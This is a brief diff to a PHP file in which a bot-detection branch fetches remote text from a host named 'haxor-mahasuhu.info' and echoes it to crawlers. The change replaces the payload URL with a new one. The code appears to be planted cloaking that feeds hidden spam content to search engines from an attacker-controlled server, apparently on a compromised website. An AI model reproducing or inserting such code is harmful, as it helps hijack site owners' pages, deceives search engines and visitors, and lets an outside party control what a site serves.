@@ -13,7 +13,7 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('https://koi.haxor-mahasuhu.info/tes/angin/dulu.txt');#NAROLINK
+    $message = file_get_contents('https://koi.haxor-mahasuhu.info/tes/disini/bentar.txt');#NAROLINK
     echo $message;
 }
 ?>
